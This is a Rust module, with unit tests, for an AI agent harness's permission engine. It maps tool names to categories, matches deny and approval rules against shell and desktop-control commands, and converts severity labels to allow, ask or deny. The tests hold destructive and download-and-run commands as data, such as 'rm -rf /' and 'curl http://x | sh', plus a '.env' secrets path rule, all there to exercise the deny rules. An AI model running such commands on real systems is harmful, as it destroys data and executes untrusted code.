//! Tool names, tool categories, rule applicability and the legacy severity table.
//!
//! Ports `openjiuwen/harness/security/permission_engine/toolguard/tool_categories.py`,
//! the matcher-facing parts of `toolguard/tool_policy.py` and
//! `toolguard/severity_mapping.py`, plus the `TOOL_NAME_ALIASES` table of
//! `openjiuwen/harness/rails/security/tool_security_rail.py` (Python v0.1.20).
//!
//! Three concerns live here:
//!
//! 1. the tool-name aliases that map model-facing tool names onto the `mcp_*`
//!    names used by configuration files;
//! 2. the tool categories (`shell`, `path`, `network`, `os_control`) and the
//!    configured `categories.shell` override that decides which tools are shell
//!    tools;
//! 3. rule applicability and the legacy `severity` → `allow`/`ask`/`deny` table.
//!
//! Everything is pure and in-memory: the packaged shell tool set is a constant, the
//! category override is read from the already-parsed [`PermissionsSection`], and no
//! check touches the filesystem or the network. Nothing panics.

use std::collections::BTreeSet;

use serde_json::Value;

use super::model::{
    ApprovalOverrideEntry, PermissionLevel, PermissionRule, PermissionsSection, RuleMatchType,
};
use super::patterns::PolicyMatcher;

/// Legacy tool-name aliases mapped to their canonical tool.
///
/// Ports `TOOL_NAME_ALIASES` from the Python permission rail: configuration files
/// name the `mcp_*` tools, while the model may call the bare historical names.
pub const TOOL_NAME_ALIASES: &[(&str, &str)] = &[
    ("free_search", "mcp_free_search"),
    ("paid_search", "mcp_paid_search"),
    ("fetch_webpage", "mcp_fetch_webpage"),
    ("web_fetch_webpage", "mcp_fetch_webpage"),
    ("exec_command", "mcp_exec_command"),
];

/// Shell tools assumed when `categories.shell` is not configured.
///
/// Python parity: `toolguard/tool_categories.py::_DEFAULT_SHELL_TOOLS`.
pub const DEFAULT_SHELL_TOOLS: &[&str] = &[
    "bash",
    "powershell",
    "core.powershell",
    "mcp_exec_command",
    "create_terminal",
];

/// Tools whose arguments name filesystem paths.
///
/// Python parity: `toolguard/tool_policy.py::_PATH_TOOLS`.
pub const PATH_TOOLS: &[&str] = &[
    "read_file",
    "write_file",
    "edit_file",
    "read_text_file",
    "write_text_file",
    "write",
    "read",
    "glob_file_search",
    "glob",
    "list_dir",
    "list_files",
    "grep",
    "search_replace",
];

/// Tools that fetch URLs.
///
/// Python parity: `toolguard/tool_policy.py::_NETWORK_TOOLS`.
pub const NETWORK_TOOLS: &[&str] = &["mcp_fetch_webpage", "mcp_free_search", "mcp_paid_search"];

/// Desktop-control (`cua`) tools, under their model-facing names.
///
/// Python parity: `toolguard/tool_policy.py::_OS_CONTROL_TOOLS` (the Python prefix
/// is empty, so the names are bare).
pub const OS_CONTROL_TOOLS: &[&str] = &[
    "click",
    "double_click",
    "right_click",
    "move_cursor",
    "drag",
    "type_text",
    "press_key",
    "hotkey",
    "scroll",
    "launch_app",
    "kill_app",
    "bring_to_front",
];

/// The only category token the tiered policy understands.
const CATEGORY_SHELL: &str = "shell";

/// Argument keys an `os_control` rule pattern may match against, in the order they
/// are consulted.
///
/// Python parity: `_OS_CONTROL_ARG_KEYS` (a `frozenset`, hence unordered there; the
/// fixed order here makes the port deterministic).
const OS_CONTROL_ARG_KEYS: &[&str] = &["text", "name", "bundle_id", "value", "key", "keys"];

/// Tool category used by the tiered policy to choose a rule's matcher.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum ToolCategory {
    /// Commands executed through a shell tool; matches on command text.
    Shell,
    /// Filesystem tools; path policy belongs to the file guard.
    Path,
    /// URL tools; URL policy belongs to the network guard.
    Network,
    /// Desktop-control tools; matches on their text/name arguments.
    OsControl,
}

/// Resolves a model-facing tool name to the name used by policy configuration.
///
/// Ports `PermissionInterruptRail._normalize_tool_name`, which is
/// `TOOL_NAME_ALIASES.get(tool_name, tool_name)`. The alias lookup is done on the
/// trimmed name, so `" free_search "` resolves; a name carrying no alias is
/// returned unchanged.
#[must_use]
pub fn normalize_tool_name(name: &str) -> String {
    let trimmed = name.trim();
    TOOL_NAME_ALIASES
        .iter()
        .find(|(alias, _)| *alias == trimmed)
        .map_or_else(|| name.to_owned(), |(_, canonical)| (*canonical).to_owned())
}

/// The shell-tool set of a permissions section.
///
/// Ports `shell_tools_from_config`: `categories["shell"]` when it holds at least one
/// non-blank name (trimmed, deduplicated), otherwise [`DEFAULT_SHELL_TOOLS`].
#[must_use]
pub fn shell_tools_from_config(section: &PermissionsSection) -> BTreeSet<String> {
    let configured: BTreeSet<String> = section
        .categories
        .get(CATEGORY_SHELL)
        .map(|names| {
            names
                .iter()
                .map(|name| name.trim())
                .filter(|name| !name.is_empty())
                .map(str::to_owned)
                .collect()
        })
        .unwrap_or_default();
    if configured.is_empty() {
        return DEFAULT_SHELL_TOOLS
            .iter()
            .map(|name| (*name).to_owned())
            .collect();
    }
    configured
}

/// Whether `tool_name` is in the resolved shell-tool set.
///
/// The category token `"shell"` is always a shell tool, exactly like Python's
/// `_tool_category`.
#[must_use]
pub fn is_shell_tool(tool_name: &str, shell_tools: &BTreeSet<String>) -> bool {
    tool_name == CATEGORY_SHELL || shell_tools.contains(tool_name)
}

/// Category of `tool_name` within `shell_tools`; `None` when it is none of them.
fn category_of(tool_name: &str, shell_tools: &BTreeSet<String>) -> Option<ToolCategory> {
    if is_shell_tool(tool_name, shell_tools) {
        return Some(ToolCategory::Shell);
    }
    if is_path_tool(tool_name) {
        return Some(ToolCategory::Path);
    }
    if is_network_tool(tool_name) {
        return Some(ToolCategory::Network);
    }
    if is_os_control_tool(tool_name) {
        return Some(ToolCategory::OsControl);
    }
    None
}

/// Category of `tool_name` under the section's configured shell tools.
///
/// Python parity: `_tool_category`. `None` means the tool is none of `shell`,
/// `path`, `network` or `os_control`, so no parameter rule of the tiered policy can
/// match it.
#[must_use]
pub fn tool_category(section: &PermissionsSection, tool_name: &str) -> Option<ToolCategory> {
    category_of(tool_name, &shell_tools_from_config(section))
}

/// Whether `tool_name` is a filesystem tool ([`PATH_TOOLS`]).
#[must_use]
pub fn is_path_tool(tool_name: &str) -> bool {
    PATH_TOOLS.contains(&tool_name)
}

/// Whether `tool_name` is a URL tool ([`NETWORK_TOOLS`]).
#[must_use]
pub fn is_network_tool(tool_name: &str) -> bool {
    NETWORK_TOOLS.contains(&tool_name)
}

/// Whether `tool_name` is a desktop-control tool ([`OS_CONTROL_TOOLS`]).
#[must_use]
pub fn is_os_control_tool(tool_name: &str) -> bool {
    OS_CONTROL_TOOLS.contains(&tool_name)
}

/// Python truthiness of a JSON value, used by [`command_text`] to mirror the
/// reference's `command or cmd or ""` fallback chain.
fn is_truthy(value: &Value) -> bool {
    match value {
        Value::Null => false,
        Value::Bool(flag) => *flag,
        // `abs() > 0.0` rather than `!= 0.0` keeps `clippy::float_cmp` quiet.
        Value::Number(number) => number.as_f64().is_some_and(|n| n.abs() > 0.0),
        Value::String(text) => !text.is_empty(),
        Value::Array(items) => !items.is_empty(),
        Value::Object(map) => !map.is_empty(),
    }
}

/// Renders a JSON value the way Python's `str()` would for the shapes seen in tool
/// arguments: strings verbatim, everything else through its JSON spelling.
fn value_to_text(value: &Value) -> String {
    match value {
        Value::String(text) => text.clone(),
        other => other.to_string(),
    }
}

/// Joins the non-null elements of an argument array with a single space
/// (Python `" ".join(str(x) for x in value if x is not None)`).
fn join_arg_parts(items: &[Value]) -> String {
    let parts: Vec<String> = items
        .iter()
        .filter(|item| !item.is_null())
        .map(value_to_text)
        .collect();
    parts.join(" ").trim().to_owned()
}

/// Raw command text of a shell tool call.
///
/// Ports `_command_text`: `args["command"]` when it is truthy, else `args["cmd"]`,
/// else the empty string; the result is trimmed. Non-string values are
/// stringified, so `{"command": 42}` yields `"42"`.
#[must_use]
pub fn command_text(args: &Value) -> String {
    let picked = ["command", "cmd"]
        .iter()
        .filter_map(|key| args.get(*key))
        .find(|value| is_truthy(value));
    picked.map_or_else(String::new, |value| value_to_text(value).trim().to_owned())
}

/// The text an `os_control` rule pattern is matched against.
///
/// Ports `_os_control_pattern_matches`: the first non-blank
/// `OS_CONTROL_ARG_KEYS` value, where a string is taken trimmed and an array is
/// joined with single spaces (nulls skipped). `None` when the call carries none of
/// those arguments.
#[must_use]
pub fn os_control_arg_text(args: &Value) -> Option<String> {
    for key in OS_CONTROL_ARG_KEYS {
        let Some(value) = args.get(*key) else {
            continue;
        };
        let text = match value {
            Value::String(raw) => raw.trim().to_owned(),
            Value::Array(items) => join_arg_parts(items),
            _ => continue,
        };
        if !text.is_empty() {
            return Some(text);
        }
    }
    None
}

/// Whether a `tools` list names `tool_name`.
///
/// Entries are trimmed; an exact name match wins, and the category token `"shell"`
/// matches every shell tool. `"*"` is *not* a wildcard here: like Python's
/// `_rule_targets_tool` it only matches a tool literally named `"*"`.
fn names_target_tool(tools: &[String], tool_name: &str, shell_tools: &BTreeSet<String>) -> bool {
    let mut names_shell_category = false;
    for entry in tools {
        let trimmed = entry.trim();
        if trimmed.is_empty() {
            continue;
        }
        if trimmed == tool_name {
            return true;
        }
        if trimmed == CATEGORY_SHELL {
            names_shell_category = true;
        }
    }
    names_shell_category && is_shell_tool(tool_name, shell_tools)
}

/// Whether `rule` applies to `tool_name`.
///
/// Ports `_rule_targets_tool`: an exact (trimmed) match on any [`PermissionRule::tools`]
/// entry, or the category token `"shell"` when the tool is a shell tool. Blank
/// entries match nothing, and `"*"` is a literal tool name rather than a wildcard.
#[must_use]
pub fn rule_applies_to(
    rule: &PermissionRule,
    tool_name: &str,
    shell_tools: &BTreeSet<String>,
) -> bool {
    names_target_tool(&rule.tools, tool_name, shell_tools)
}

/// Whether a rule's `tools` list names a single, resolvable category.
///
/// Ports `rule_tools_category_consistent`: a rule mixing `"shell"` with non-shell
/// tools, mixing two categories, or naming no resolvable tool at all is malformed
/// and must be skipped (`false`). Every other combination — including several tools
/// of the same category — is consistent.
#[must_use]
pub fn rule_tools_consistent(rule: &PermissionRule, shell_tools: &BTreeSet<String>) -> bool {
    let mut found: Option<ToolCategory> = None;
    for entry in &rule.tools {
        let trimmed = entry.trim();
        if trimmed.is_empty() {
            continue;
        }
        let Some(category) = category_of(trimmed, shell_tools) else {
            return false;
        };
        match found {
            Some(existing) if existing != category => return false,
            _ => found = Some(category),
        }
    }
    found.is_some()
}

/// Whether `rule`'s pattern matches this tool call.
///
/// Ports `tiered_policy_rule_matches`, restricted to what the tiered pipeline owns:
///
/// - shell rules match [`command_text`] through [`PolicyMatcher`] (exact, shell
///   wildcard or `re:` regex);
/// - `os_control` rules match [`os_control_arg_text`];
/// - `path` and `network` rules never match here — paths and URLs belong to the
///   file and network guards;
/// - an unresolvable category, a blank pattern or a rule naming no tool never
///   matches.
///
/// The category is taken from `tool_name`, so callers must first confirm that the
/// rule targets the tool with [`rule_applies_to`] (and that it is well formed with
/// [`rule_tools_consistent`]).
#[must_use]
pub fn rule_matches(
    section: &PermissionsSection,
    rule: &PermissionRule,
    tool_name: &str,
    args: &Value,
) -> bool {
    let pattern = rule.pattern.trim();
    if pattern.is_empty() || rule.tools.iter().all(|entry| entry.trim().is_empty()) {
        return false;
    }
    let matcher = PolicyMatcher::new(pattern);
    let shell_tools = shell_tools_from_config(section);
    match category_of(tool_name, &shell_tools) {
        Some(ToolCategory::Shell) => {
            let command = command_text(args);
            !command.is_empty() && matcher.matches(&command)
        }
        Some(ToolCategory::OsControl) => {
            os_control_arg_text(args).is_some_and(|text| matcher.matches(&text))
        }
        Some(ToolCategory::Path | ToolCategory::Network) | None => false,
    }
}

/// Label of a rule inside `matched_rule`.
///
/// Python parity: `builtin[<id>]` for packaged rules (`layer: "builtin"`), else
/// `rules[<id>]`; a blank id renders as `?`.
#[must_use]
pub fn rule_ref(rule: &PermissionRule) -> String {
    let is_builtin = rule
        .layer
        .as_deref()
        .is_some_and(|layer| layer.trim() == "builtin");
    let namespace = if is_builtin { "builtin" } else { "rules" };
    let id = rule.id.trim();
    let id = if id.is_empty() { "?" } else { id };
    format!("{namespace}[{id}]")
}

/// Normalizes `permission_mode` to `"normal"` or `"strict"`.
///
/// Ports `normalize_permission_mode`: a missing, blank or unrecognised mode
/// (`"yolo"`) is `"normal"`; `"strict"` is matched ignoring surrounding whitespace
/// and ASCII case.
#[must_use]
pub fn normalize_permission_mode(mode: Option<&str>) -> &'static str {
    match mode {
        Some(raw) if raw.trim().eq_ignore_ascii_case("strict") => "strict",
        _ => "normal",
    }
}

/// The action word of a legacy severity label, or `None` when there is no severity.
///
/// Ports `severity_to_action` (the product table):
///
/// | severity | normal  | strict |
/// |----------|---------|--------|
/// | `LOW` | `allow` | `allow` |
/// | `MEDIUM` | `allow` | `ask` |
/// | `HIGH` | `ask` | `ask` |
/// | `CRITICAL` | `ask` | `deny` |
///
/// A blank severity yields `None` so callers leave `action` unset; an unrecognised
/// word is treated as `HIGH`, i.e. `ask`, in both modes.
#[must_use]
pub fn severity_to_action(severity: Option<&str>, mode: &str) -> Option<&'static str> {
    let label = severity?.trim().to_ascii_uppercase();
    if label.is_empty() {
        return None;
    }
    let strict = normalize_permission_mode(Some(mode)) == "strict";
    Some(match label.as_str() {
        "LOW" => "allow",
        "MEDIUM" if !strict => "allow",
        "CRITICAL" if strict => "deny",
        _ => "ask",
    })
}

/// [`severity_to_action`] as a [`PermissionLevel`], or `None` when there is no
/// severity.
#[must_use]
pub fn severity_to_decision(severity: Option<&str>, mode: &str) -> Option<PermissionLevel> {
    severity_to_action(severity, mode).and_then(PermissionLevel::parse)
}

/// Whether a remembered approval override matches this tool call.
///
/// Ports `_collect_approval_override_hits` matching: the override must name the tool
/// exactly (`["*"]` matches nothing, the `"shell"` category token matches every
/// shell tool) and, for [`RuleMatchType::Command`] entries, its pattern must match
/// [`command_text`] through [`PolicyMatcher`]. [`RuleMatchType::Path`] entries never
/// match here — path allows belong to the file guard — and a blank pattern or an
/// empty command never matches.
///
/// The entry's [`ApprovalOverrideEntry::action`] is not consulted; the caller folds
/// the level.
#[must_use]
pub fn approval_override_applies(
    entry: &ApprovalOverrideEntry,
    tool_name: &str,
    shell_tools: &BTreeSet<String>,
    args: &Value,
) -> bool {
    if entry.match_type == RuleMatchType::Path {
        return false;
    }
    if !names_target_tool(&entry.tools, tool_name, shell_tools) {
        return false;
    }
    let pattern = entry.pattern.trim();
    if pattern.is_empty() {
        return false;
    }
    let command = command_text(args);
    !command.is_empty() && PolicyMatcher::new(pattern).matches(&command)
}

#[cfg(test)]
mod tests {
    #![allow(clippy::unwrap_used, clippy::expect_used)]

    use serde_json::json;

    use super::*;

    fn default_shell_tools() -> BTreeSet<String> {
        DEFAULT_SHELL_TOOLS
            .iter()
            .map(|name| (*name).to_owned())
            .collect()
    }

    fn rule(tools: &[&str], pattern: &str) -> PermissionRule {
        PermissionRule {
            id: "r".to_owned(),
            tools: tools.iter().map(|tool| (*tool).to_owned()).collect(),
            pattern: pattern.to_owned(),
            action: Some(PermissionLevel::Deny),
            ..PermissionRule::default()
        }
    }

    fn section_with_shell(names: &[&str]) -> PermissionsSection {
        let mut section = PermissionsSection::default();
        section.categories.insert(
            "shell".to_owned(),
            names.iter().map(|name| (*name).to_owned()).collect(),
        );
        section
    }

    fn applies(rule: &PermissionRule, tool: &str) -> bool {
        rule_applies_to(rule, tool, &default_shell_tools())
    }

    fn matches(rule: &PermissionRule, tool: &str, args: &Value) -> bool {
        rule_matches(&PermissionsSection::default(), rule, tool, args)
    }

    fn override_entry(tools: &[&str], pattern: &str) -> ApprovalOverrideEntry {
        ApprovalOverrideEntry {
            id: "allow".to_owned(),
            tools: tools.iter().map(|tool| (*tool).to_owned()).collect(),
            pattern: pattern.to_owned(),
            ..ApprovalOverrideEntry::default()
        }
    }

    fn override_matches(entry: &ApprovalOverrideEntry, tool: &str, args: &Value) -> bool {
        approval_override_applies(entry, tool, &default_shell_tools(), args)
    }

    // ----- aliases ---------------------------------------------------------

    #[test]
    fn aliases_map_to_the_mcp_tools() {
        assert_eq!(TOOL_NAME_ALIASES.len(), 5);
        for (alias, canonical) in TOOL_NAME_ALIASES {
            assert_eq!(normalize_tool_name(alias), *canonical, "{alias}");
            assert_eq!(normalize_tool_name(&format!("  {alias} ")), *canonical);
        }
        assert_eq!(normalize_tool_name("fetch_webpage"), "mcp_fetch_webpage");
        assert_eq!(normalize_tool_name("bash"), "bash");
        assert_eq!(normalize_tool_name(""), "");
        assert_eq!(
            normalize_tool_name("free_search_extra"),
            "free_search_extra"
        );
    }

    // ----- shell tools -----------------------------------------------------

    #[test]
    fn shell_tools_default_when_unconfigured() {
        let shell_tools = shell_tools_from_config(&PermissionsSection::default());
        assert_eq!(shell_tools, default_shell_tools());
        for tool in DEFAULT_SHELL_TOOLS {
            assert!(is_shell_tool(tool, &shell_tools), "{tool}");
        }
        assert!(is_shell_tool("shell", &BTreeSet::new()), "category token");
        assert!(!is_shell_tool("bash", &BTreeSet::new()));

        let blanks = section_with_shell(&["   ", ""]);
        assert_eq!(shell_tools_from_config(&blanks), default_shell_tools());
    }

    #[test]
    fn shell_tools_override_replaces_the_default_set() {
        let section = section_with_shell(&[" run_cmd ", "sh"]);
        let shell_tools = shell_tools_from_config(&section);
        assert_eq!(
            shell_tools,
            BTreeSet::from(["run_cmd".to_owned(), "sh".to_owned()])
        );
        assert!(is_shell_tool("run_cmd", &shell_tools));
        assert!(
            !is_shell_tool("bash", &shell_tools),
            "the override replaces the default set"
        );
        assert_eq!(tool_category(&section, "bash"), None);
        assert_eq!(
            tool_category(&section, "run_cmd"),
            Some(ToolCategory::Shell)
        );
    }

    // ----- categories ------------------------------------------------------

    #[test]
    fn tool_category_recognises_every_category() {
        let section = PermissionsSection::default();
        let cases = [
            ("bash", Some(ToolCategory::Shell)),
            ("shell", Some(ToolCategory::Shell)),
            ("read_file", Some(ToolCategory::Path)),
            ("mcp_fetch_webpage", Some(ToolCategory::Network)),
            ("click", Some(ToolCategory::OsControl)),
            ("unknown_tool", None),
            ("", None),
            ("Bash", None),
        ];
        for (tool, expected) in cases {
            assert_eq!(tool_category(&section, tool), expected, "{tool}");
        }
        assert!(PATH_TOOLS.iter().all(|tool| is_path_tool(tool)));
        assert!(NETWORK_TOOLS.iter().all(|tool| is_network_tool(tool)));
        assert!(OS_CONTROL_TOOLS.iter().all(|tool| is_os_control_tool(tool)));
        assert!(!is_path_tool("bash"));
        assert!(!is_network_tool("read_file"));
        assert!(!is_os_control_tool("bash"));
    }

    // ----- rule applicability ---------------------------------------------

    #[test]
    fn shell_category_rules_apply_to_every_shell_tool() {
        let shell_rule = rule(&["shell"], "rm -rf *");
        assert!(applies(&shell_rule, "bash"));
        assert!(applies(&shell_rule, "powershell"));
        assert!(!applies(&shell_rule, "read_file"));

        let overridden = shell_tools_from_config(&section_with_shell(&["run_cmd"]));
        assert!(rule_applies_to(&shell_rule, "run_cmd", &overridden));
        assert!(!rule_applies_to(&shell_rule, "bash", &overridden));
        assert!(rule_matches(
            &section_with_shell(&["run_cmd"]),
            &shell_rule,
            "run_cmd",
            &json!({"command": "rm -rf /"})
        ));
        assert!(!rule_matches(
            &section_with_shell(&["run_cmd"]),
            &shell_rule,
            "bash",
            &json!({"command": "rm -rf /"})
        ));
    }

    #[test]
    fn rule_tool_names_are_literal_after_trimming() {
        let exact = rule(&[" bash "], "rm *");
        assert!(applies(&exact, "bash"));
        assert!(!applies(&exact, "zsh"));

        let wildcard = rule(&["*"], "*");
        assert!(!applies(&wildcard, "bash"));
        assert!(!applies(&wildcard, "read_file"));
        // `"*"` is literal equality, never a wildcard: a tool that is itself named
        // `"*"` still matches, exactly like Python's `tool_name in r_tools_s`.
        assert!(applies(&wildcard, "*"));
    }

    #[test]
    fn inconsistent_rule_tools_are_skipped() {
        let shell_tools = default_shell_tools();
        let cases = [
            (vec!["shell"], true),
            (vec!["bash", "powershell"], true),
            (vec!["read_file", "write_file"], true),
            (vec!["click", "type_text"], true),
            (vec!["shell", "read_file"], false),
            (vec!["read_file", "bash"], false),
            (vec!["*"], false),
            (vec![], false),
            (vec!["  "], false),
            (vec!["bash", "unknown_tool"], false),
        ];
        for (tools, expected) in cases {
            assert_eq!(
                rule_tools_consistent(&rule(&tools, "x"), &shell_tools),
                expected,
                "{tools:?}"
            );
        }
    }

    // ----- argument extraction --------------------------------------------

    #[test]
    fn command_text_prefers_command_over_cmd() {
        assert_eq!(command_text(&json!({"command": "ls -la"})), "ls -la");
        assert_eq!(
            command_text(&json!({"command": "ls -la", "cmd": "rm -rf /"})),
            "ls -la"
        );
        assert_eq!(command_text(&json!({"cmd": "rm -rf /"})), "rm -rf /");
        assert_eq!(command_text(&json!({"command": "  ls  "})), "ls");
        assert_eq!(
            command_text(&json!({"command": "", "cmd": "echo hi"})),
            "echo hi"
        );
        assert_eq!(command_text(&json!({"command": 42})), "42");
        assert_eq!(command_text(&json!({"command": true})), "true");
        assert_eq!(command_text(&json!({})), "");
        assert_eq!(command_text(&json!("not an object")), "");
    }

    #[test]
    fn os_control_arg_text_picks_the_first_non_blank_key() {
        let cases = [
            (json!({"text": "hello"}), Some("hello")),
            (json!({"text": "  ", "name": "Safari"}), Some("Safari")),
            (json!({"name": "", "bundle_id": "com.x"}), Some("com.x")),
            (json!({"keys": ["CMD", "S"]}), Some("CMD S")),
            (json!({"keys": [null, "F5"]}), Some("F5")),
            (json!({"key": "ENTER"}), Some("ENTER")),
            (json!({"x": 1, "y": 2}), None),
            (json!({"text": 3}), None),
            (json!({"keys": [null]}), None),
        ];
        for (args, expected) in cases {
            assert_eq!(os_control_arg_text(&args).as_deref(), expected, "{args}");
        }
    }

    // ----- rule matching ---------------------------------------------------

    #[test]
    fn shell_rules_match_the_command_text() {
        let shell_rule = rule(&["shell"], "rm *");
        assert!(matches(
            &shell_rule,
            "bash",
            &json!({"command": "rm -rf /tmp/x"})
        ));
        assert!(!matches(&shell_rule, "bash", &json!({"command": "ls -la"})));
        assert!(!matches(&shell_rule, "bash", &json!({})));
    }

    #[test]
    fn shell_rules_support_exact_wildcard_and_regex_patterns() {
        let exact = rule(&["bash"], "ls -la");
        assert!(matches(&exact, "bash", &json!({"command": "ls -la"})));
        assert!(!matches(
            &exact,
            "bash",
            &json!({"command": "ls -la; rm -rf /"})
        ));

        let regex = rule(&["shell"], r"re:curl .*\|.*sh");
        assert!(matches(
            &regex,
            "bash",
            &json!({"cmd": "curl http://x | sh"})
        ));

        let blank = rule(&["shell"], "   ");
        assert!(!matches(&blank, "bash", &json!({"command": "ls"})));
    }

    #[test]
    fn os_control_rules_match_their_text_arguments() {
        let os_rule = rule(&["type_text"], "rm -rf *");
        assert!(matches(&os_rule, "type_text", &json!({"text": "rm -rf /"})));
        assert!(!matches(&os_rule, "type_text", &json!({"text": "hello"})));
        assert!(!matches(&os_rule, "type_text", &json!({})));
    }

    #[test]
    fn path_and_network_rules_never_match_in_the_tiered_pipeline() {
        let path_rule = rule(&["read_file"], "**/.env");
        assert!(!matches(
            &path_rule,
            "read_file",
            &json!({"path": "/home/.env"})
        ));

        let net_rule = rule(&["mcp_fetch_webpage"], "*");
        assert!(!matches(
            &net_rule,
            "mcp_fetch_webpage",
            &json!({"url": "https://example.com"})
        ));

        let unknown_rule = rule(&["mystery_tool"], "*");
        assert!(!matches(
            &unknown_rule,
            "mystery_tool",
            &json!({"command": "ls"})
        ));

        let no_tools = rule(&[], "ls");
        assert!(!matches(&no_tools, "bash", &json!({"command": "ls"})));
    }

    // ----- labels ----------------------------------------------------------

    #[test]
    fn rule_ref_labels_the_layer_and_id() {
        let mut packaged = rule(&["shell"], "rm *");
        packaged.id = "deny-rm".to_owned();
        packaged.layer = Some("builtin".to_owned());
        assert_eq!(rule_ref(&packaged), "builtin[deny-rm]");

        let mut user = rule(&["shell"], "rm *");
        user.id = "deny-rm".to_owned();
        assert_eq!(rule_ref(&user), "rules[deny-rm]");

        let mut blank = rule(&["shell"], "rm *");
        blank.id = "  ".to_owned();
        assert_eq!(rule_ref(&blank), "rules[?]");
        blank.layer = Some("builtin".to_owned());
        assert_eq!(rule_ref(&blank), "builtin[?]");
    }

    // ----- permission mode and severity ------------------------------------

    #[test]
    fn permission_mode_and_severity_tables() {
        assert_eq!(normalize_permission_mode(None), "normal");
        assert_eq!(normalize_permission_mode(Some("")), "normal");
        assert_eq!(normalize_permission_mode(Some("yolo")), "normal");
        assert_eq!(normalize_permission_mode(Some("STRICT")), "strict");
        assert_eq!(normalize_permission_mode(Some(" strict ")), "strict");

        let normal = [
            ("LOW", "allow"),
            ("MEDIUM", "allow"),
            ("HIGH", "ask"),
            ("CRITICAL", "ask"),
            ("SEVERE", "ask"),
        ];
        for (severity, expected) in normal {
            assert_eq!(
                severity_to_action(Some(severity), "normal"),
                Some(expected),
                "{severity}"
            );
        }

        let strict = [
            ("LOW", "allow"),
            ("MEDIUM", "ask"),
            ("HIGH", "ask"),
            ("CRITICAL", "deny"),
            ("SEVERE", "ask"),
        ];
        for (severity, expected) in strict {
            assert_eq!(
                severity_to_action(Some(severity), "strict"),
                Some(expected),
                "{severity}"
            );
        }

        assert_eq!(severity_to_action(Some("low"), "normal"), Some("allow"));
        assert_eq!(severity_to_action(Some("CRITICAL"), "STRICT"), Some("deny"));
        assert_eq!(severity_to_action(Some("MEDIUM"), "yolo"), Some("allow"));
        assert_eq!(severity_to_action(None, "normal"), None);
        assert_eq!(severity_to_action(Some("   "), "strict"), None);
        assert_eq!(severity_to_decision(None, "normal"), None);
        assert_eq!(
            severity_to_decision(Some("CRITICAL"), "strict"),
            Some(PermissionLevel::Deny)
        );
        assert_eq!(
            severity_to_decision(Some("low"), "normal"),
            Some(PermissionLevel::Allow)
        );
    }

    // ----- approval overrides ---------------------------------------------

    #[test]
    fn approval_overrides_match_the_exact_tool_and_command() {
        let entry = override_entry(&["bash"], "ls*");
        assert!(override_matches(
            &entry,
            "bash",
            &json!({"command": "ls -la"})
        ));
        assert!(!override_matches(
            &entry,
            "zsh",
            &json!({"command": "ls -la"})
        ));
        assert!(!override_matches(
            &entry,
            "bash",
            &json!({"command": "rm -rf /"})
        ));

        let regex = override_entry(&["bash"], r"re:^ls (-la)?$");
        assert!(override_matches(
            &regex,
            "bash",
            &json!({"command": "ls -la"})
        ));
        assert!(!override_matches(
            &regex,
            "bash",
            &json!({"command": "ls -lh"})
        ));
    }

    #[test]
    fn approval_overrides_accept_the_shell_category_token() {
        let entry = override_entry(&["shell"], "git status");
        assert!(override_matches(
            &entry,
            "bash",
            &json!({"command": "git status"})
        ));

        let overridden = shell_tools_from_config(&section_with_shell(&["run_cmd"]));
        assert!(!approval_override_applies(
            &entry,
            "bash",
            &overridden,
            &json!({"command": "git status"})
        ));
        assert!(approval_override_applies(
            &entry,
            "run_cmd",
            &overridden,
            &json!({"command": "git status"})
        ));
    }

    #[test]
    fn approval_overrides_never_match_wildcards_paths_or_blank_patterns() {
        let wildcard = override_entry(&["*"], "ls");
        assert!(!override_matches(
            &wildcard,
            "bash",
            &json!({"command": "ls"})
        ));

        let mut path = override_entry(&["bash"], "ls");
        path.match_type = RuleMatchType::Path;
        assert!(!override_matches(&path, "bash", &json!({"command": "ls"})));

        let blank = override_entry(&["bash"], "  ");
        assert!(!override_matches(&blank, "bash", &json!({"command": "ls"})));

        let no_command = override_entry(&["bash"], "ls");
        assert!(!override_matches(&no_command, "bash", &json!({})));
    }
}
